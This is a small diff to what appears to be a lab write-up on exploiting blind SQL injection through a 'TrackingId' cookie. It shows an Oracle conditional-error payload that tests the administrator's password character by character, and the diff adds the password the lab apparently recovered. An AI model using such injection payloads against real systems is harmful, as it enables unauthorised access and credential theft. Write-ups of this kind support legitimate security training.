@@ -60,6 +60,9 @@ Exploit a blind SQL injection vulnerability in the `TrackingId` cookie to extrac
 ```sql
 '||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
+
+**Extracted Password:**
+
 ```text
 4ty7g5fzix6hit156dyl
 ```
